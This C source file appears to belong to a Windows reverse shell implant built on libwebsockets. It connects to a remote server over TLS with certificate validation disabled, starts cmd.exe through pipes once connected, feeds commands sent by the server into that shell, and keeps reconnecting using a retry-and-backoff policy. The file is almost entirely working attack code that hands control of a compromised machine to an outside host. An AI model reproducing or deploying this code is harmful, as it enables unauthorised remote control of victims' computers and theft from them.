#include "pa5a.hpp"

EXTERN_C_START

/********************************************************************************************************************************/
static struct my_conn
{
	lws_sorted_usec_list_t	sul;	     /* schedule connection retry */
	struct lws* wsi;	     /* related wsi if any */
	uint16_t		retry_count; /* count of consequetive retries */
} mco;

static int interrupted;
static const char* pro = "dumb-increment-protocol";

// The retry and backoff policy we want to use for our client connections
static const uint32_t backoff_ms[] = { 1000, 2000, 3000, 4000, 5000 };

static const lws_retry_bo_t retry =
{
	.retry_ms_table = backoff_ms,
	.retry_ms_table_count = LWS_ARRAY_SIZE(backoff_ms),
	.conceal_count = LWS_ARRAY_SIZE(backoff_ms),

	.secs_since_valid_ping = 3,  /* force PINGs after secs idle */
	.secs_since_valid_hangup = 10, /* hangup after secs idle */

	.jitter_percent = 20,
};

static const struct lws_protocols protocols[] =
{
	{ "lws-minimal-client", callback_minimal, sizeof(WebSocketData), 0, },
	{ NULL, NULL, 0, 0 }
};

/********************************************************************************************************************************/
VOID connect_client(lws_sorted_usec_list_t* sul)
{
	struct my_conn* mco = lws_container_of(sul, struct my_conn, sul);
	struct lws_client_connect_info i = { 0 };
	static int port = 443;

	const char* server_address = SERVER_NAME_A;

	i.context = context;
	i.port = port;
	i.address = server_address;
	i.path = REVERSE_SHELL_WS_A;
	i.host = i.address;
	i.origin = i.address;
	i.protocol = pro;
	i.local_protocol_name = "lws-minimal-client";
	i.pwsi = &mco->wsi;
	i.retry_and_idle_policy = &retry;
	i.userdata = mco;
	i.ssl_connection = LCCSCF_USE_SSL | LCCSCF_ALLOW_SELFSIGNED | LCCSCF_ALLOW_INSECURE | LCCSCF_SKIP_SERVER_CERT_HOSTNAME_CHECK;

	if (!lws_client_connect_via_info(&i))
		/*
		 * Failed... schedule a retry... we can't use the _retry_wsi()
		 * convenience wrapper api here because no valid wsi at this
		 * point.
		 */
		if (lws_retry_sul_schedule(context, 0, sul, &retry, connect_client, &mco->retry_count))
		{
			lwsl_err("%s: connection attempts exhausted\n", __func__);
			interrupted = 1;
		}
}
/********************************************************************************************************************************/
INT callback_minimal(struct lws* socket, enum lws_callback_reasons reason, void* user, void* in, size_t len)
{
	struct my_conn* mco = (struct my_conn*)user;
	char buf[LWS_PRE + BUFSIZE] = { 0 };
	
	switch (reason)
	{
		printf("reason = %d\n", reason);

	case LWS_CALLBACK_CLIENT_CONNECTION_ERROR:
		lwsl_err("CLIENT_CONNECTION_ERROR: %s\n", in ? (char*)in : "(null)");
		goto do_retry;
		break;

	case LWS_CALLBACK_CLIENT_RECEIVE:

		//lwsl_user("Message from the server: %s \n", in);
		lwsl_user("COMMAND RECEIVE: %s \n", in);

		//sprintf_s((void*)buf, sizeof(buf), "%.*s\n",(int)len, (char*)in);
		sprintf_s(buf, sizeof(buf), "%.*s\n", (int)len, (char*)in);
		if (WriteToPipe(buf, (WebSocketData*)user) == FALSE)
		{
			printf("Failed to write on pipe\n");
		}
		break;

	case LWS_CALLBACK_CLIENT_ESTABLISHED:
	{
		((WebSocketData*)user)->socket = socket;

		//Here connection is successful !
		lwsl_user("Connection with the server established\n");

		if (CreatePipes((WebSocketData*)user) == FALSE)
		{
			printf("Failed to CreatePipes\n");
			return -1;
		}

		printf("[+] - Pipes are create\n");

		if (CreateChildProcess(L"C:\\Windows\\System32\\cmd.exe", (WebSocketData*)user) == 0) {

			printf("Failed to create child process\n");
			return -1;
		}

		printf("[+] - Child process is now create\n");

		((WebSocketData*)user)->hThreadRead = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadProc, (WebSocketData*)user, 0, NULL);

		break;
	}
		
	case LWS_CALLBACK_CLIENT_CLOSED:

		if (((WebSocketData*)user)->hThreadRead)
		{
			BOOL ret = TerminateThread(((WebSocketData*)user)->hThreadRead, 0);
			printf("Thread Read ended: GetLastError(%d)\n", GetLastError());
		}

		if (((WebSocketData*)user)->hCmdProcess)
		{
			BOOL ret = TerminateProcess(((WebSocketData*)user)->hCmdProcess, 0);
			printf("Process ended: GetLastError(%d)\n", GetLastError());
		}
			
		break;
		goto do_retry;

	default:
		break;
	}

	//(struct lws*)((struct WebSocketData*)wsData)->socket = socket;
	return lws_callback_http_dummy(socket, reason, user, in, len);

do_retry:
	/*
	 * retry the connection to keep it nailed up
	 *
	 * For this example, we try to conceal any problem for one set of
	 * backoff retries and then exit the app.
	 *
	 * If you set retry.conceal_count to be larger than the number of
	 * elements in the backoff table, it will never give up and keep
	 * retrying at the last backoff delay plus the random jitter amount.
	 */
	if (lws_retry_sul_schedule_retry_wsi(socket, &mco->sul, connect_client, &mco->retry_count))
	{
		lwsl_err("%s: connection attempts exhausted\n", __func__);
		interrupted = 1;
	}

	return 0;
}
/********************************************************************************************************************************/
// Make the connection with the server
BOOL WS_Connection()
{
	//struct WebSocketData wsData = { 0 };
	struct lws_context_creation_info info = { 0 };
	int n = 0;

	lwsl_user("Reverse Shell\n");
	
	info.options = LWS_SERVER_OPTION_DO_SSL_GLOBAL_INIT;
	info.port = CONTEXT_PORT_NO_LISTEN; /* we do not run any server */
	info.protocols = protocols;

	info.fd_limit_per_thread = 1 + 1 + 1;

	context = lws_create_context(&info);
	if (!context)
	{
		lwsl_err("lws init failed\n");
		return FALSE;
	}

	/* schedule the first client connection attempt to happen immediately */
	lws_sul_schedule(context, 0, &mco.sul, connect_client, 1);

	while (n >= 0 && !interrupted)
	{
		n = lws_service(context, 0);
	}
	
	lws_context_destroy(context);
	
	lwsl_user("Completed\n");

	return TRUE;
}
/********************************************************************************************************************************/

EXTERN_C_END